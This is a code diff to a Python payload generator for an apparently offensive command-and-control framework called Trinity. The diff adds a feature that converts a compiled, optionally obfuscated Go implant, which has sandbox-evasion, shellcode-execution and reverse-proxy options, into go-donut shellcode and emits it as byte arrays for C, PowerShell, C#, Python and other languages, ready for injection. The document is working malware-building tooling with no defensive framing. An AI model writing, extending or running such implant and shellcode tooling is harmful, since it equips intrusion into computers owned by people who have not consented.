@@ -99,7 +99,7 @@ class TrinityPayloadGenerator:
     def _generate_fernet_key(self):
         return Fernet.generate_key().decode()
 
-    def generate_payload(self, listener_id, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, use_failover=False, include_bof=True, include_assembly=True, include_pe=True, include_execute_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True, kill_date='2025-12-31T23:59:59Z', working_hours=None, redirector_host='0.0.0.0', redirector_port=80, failover_urls=None, profile_headers=None):
+    def generate_payload(self, listener_id, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, use_failover=False, include_bof=True, include_assembly=True, include_pe=True, include_execute_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True, kill_date='2025-12-31T23:59:59Z', working_hours=None, redirector_host='0.0.0.0', redirector_port=80, failover_urls=None, profile_headers=None, shellcode_format=None):
         if failover_urls is None:
             failover_urls = []
         if profile_headers is None:
@@ -187,10 +187,10 @@ class TrinityPayloadGenerator:
         })
 
         return self._generate_go_agent(
-            agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers, include_bof=include_bof, include_assembly=include_assembly, include_pe=include_pe, include_execute_pe=include_execute_pe, include_shellcode=include_shellcode, include_reverse_proxy=include_reverse_proxy, include_sandbox=include_sandbox
+            agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers, include_bof=include_bof, include_assembly=include_assembly, include_pe=include_pe, include_execute_pe=include_execute_pe, include_shellcode=include_shellcode, include_reverse_proxy=include_reverse_proxy, include_sandbox=include_sandbox, shellcode_format=shellcode_format
         )
 
-    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None, profile_headers=None, include_bof=True, include_assembly=True, include_pe=True, include_execute_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True):
+    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None, profile_headers=None, include_bof=True, include_assembly=True, include_pe=True, include_execute_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True, shellcode_format=None):
         if failover_urls is None:
             failover_urls = []
         if profile_headers is None:
@@ -963,9 +963,169 @@ class TrinityPayloadGenerator:
 
                 print(f"[+] Polymorphic Trinity agent compiled successfully to: {final_exe_path}")
 
+                # If shellcode format is specified, convert the exe to shellcode using go-donut
+                if shellcode_format is not None:
+                    return self._convert_to_shellcode(final_exe_path, shellcode_format)
+
                 return final_exe_path
 
             except subprocess.CalledProcessError as e:
                 raise Exception(f"Failed to compile Trinity agent: {str(e)}")
             except FileNotFoundError:
                 raise Exception("Go compiler not found. Please install Go and ensure 'go' command is in PATH.") # See documentation
+
+    def _convert_to_shellcode(self, exe_path, shellcode_format):
+        import subprocess
+        import os
+        from datetime import datetime
+
+        # Determine the output format for go-donut based on the requested format
+        format_map = {
+            'raw': 1,
+            'base64': 2,
+            'c': 3,
+            'ruby': 4,
+            'python': 5,
+            'powershell': 6,
+            'csharp': 7,
+            'hex': 8
+        }
+
+        # Create output filename based on format
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        base_name = os.path.splitext(os.path.basename(exe_path))[0]
+
+        # Map format to file extension
+        ext_map = {
+            'raw': 'bin',
+            'base64': 'b64',
+            'c': 'c',
+            'ruby': 'rb',
+            'python': 'py',
+            'powershell': 'ps1',
+            'csharp': 'cs',
+            'hex': 'hex'
+        }
+
+        output_ext = ext_map.get(shellcode_format.lower(), 'bin')
+        output_filename = f"{base_name}_shellcode_{timestamp}.{output_ext}"
+        output_path = os.path.join('logs', output_filename)
+
+        # Path to go-donut binary
+        donut_path = os.path.join(os.path.dirname(__file__), 'go-donut', 'go-donut')
+
+        if not os.path.exists(donut_path):
+            raise Exception(f"go-donut binary not found at {donut_path}")
+
+        # For formats that go-donut doesn't properly support (3=c, 4=ruby, 5=python, 6=powershell, 7=csharp, 8=hex),
+        # we need to get raw shellcode first and then convert it to the desired format
+        if shellcode_format.lower() in ['c', 'ruby', 'python', 'powershell', 'csharp', 'hex']:
+            # Get raw shellcode first
+            raw_output_path = os.path.join('logs', f"{base_name}_shellcode_{timestamp}_raw.bin")
+            cmd = [
+                donut_path,
+                '-f', '1',              # raw format
+                '-a', 'x64',            # architecture
+                '-o', raw_output_path,  # output file
+                '-i', exe_path          # input file
+            ]
+
+            try:
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+                if result.returncode != 0:
+                    raise Exception(f"go-donut conversion failed: {result.stderr}")
+
+                # Read the raw shellcode
+                with open(raw_output_path, 'rb') as f:
+                    raw_shellcode = f.read()
+
+                # Convert to the requested format
+                formatted_shellcode = self._format_shellcode(raw_shellcode, shellcode_format.lower())
+
+                # Write the formatted shellcode to the output file
+                with open(output_path, 'w') as f:
+                    f.write(formatted_shellcode)
+
+                # Clean up the temporary raw file
+                os.remove(raw_output_path)
+
+                print(f"[+] Trinity agent converted to {shellcode_format} shellcode: {output_path}")
+
+                # Clean up the original exe file since we only wanted shellcode
+                if os.path.exists(exe_path):
+                    os.remove(exe_path)
+                    print(f"[+] Cleaned up original exe file: {exe_path}")
+
+                return output_path
+            except subprocess.TimeoutExpired:
+                # Clean up the temporary raw file if it exists
+                if os.path.exists(raw_output_path):
+                    os.remove(raw_output_path)
+                raise Exception("go-donut conversion timed out")
+            except Exception as e:
+                # Clean up the temporary raw file if it exists
+                if os.path.exists(raw_output_path):
+                    os.remove(raw_output_path)
+                raise Exception(f"Failed to convert to shellcode: {str(e)}")
+        else:
+            # For raw and base64, use go-donut directly
+            donut_format = format_map.get(shellcode_format.lower(), 1)
+
+            cmd = [
+                donut_path,
+                '-f', str(donut_format),  # format
+                '-a', 'x64',              # architecture
+                '-o', output_path,        # output file
+                '-i', exe_path            # input file
+            ]
+
+            try:
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+                if result.returncode != 0:
+                    raise Exception(f"go-donut conversion failed: {result.stderr}")
+
+                print(f"[+] Trinity agent converted to {shellcode_format} shellcode: {output_path}")
+
+                # Clean up the original exe file since we only wanted shellcode
+                if os.path.exists(exe_path):
+                    os.remove(exe_path)
+                    print(f"[+] Cleaned up original exe file: {exe_path}")
+
+                return output_path
+            except subprocess.TimeoutExpired:
+                raise Exception("go-donut conversion timed out")
+            except Exception as e:
+                raise Exception(f"Failed to convert to shellcode: {str(e)}")
+
+    def _format_shellcode(self, raw_shellcode, format_type):
+        if format_type == 'c':
+            # Format as C-style array
+            hex_values = [f"0x{byte:02x}" for byte in raw_shellcode]
+            c_array = ", ".join(hex_values)
+            return f"unsigned char shellcode[] = {{\n{c_array}\n}};"
+        elif format_type == 'python':
+            # Format as Python list
+            hex_values = [f"0x{byte:02x}" for byte in raw_shellcode]
+            python_list = ", ".join(hex_values)
+            return f"shellcode = [{python_list}]"
+        elif format_type == 'ruby':
+            # Format as Ruby array
+            hex_values = [f"0x{byte:02x}" for byte in raw_shellcode]
+            ruby_array = ", ".join(hex_values)
+            return f"shellcode = [{ruby_array}]"
+        elif format_type == 'powershell':
+            # Format as PowerShell byte array
+            hex_values = [f"0x{byte:02x}" for byte in raw_shellcode]
+            ps_array = ", ".join(hex_values)
+            return f"[Byte[]] $shellcode = ({ps_array})"
+        elif format_type == 'csharp':
+            # Format as C# byte array
+            hex_values = [f"0x{byte:02x}" for byte in raw_shellcode]
+            csharp_array = ", ".join(hex_values)
+            return f"byte[] shellcode = new byte[] {{ {csharp_array} }};"
+        elif format_type == 'hex':
+            # Format as hex string
+            return ''.join([f"{byte:02x}" for byte in raw_shellcode])
+        else:
+            # Default to raw bytes if format not recognized
+            return raw_shellcode
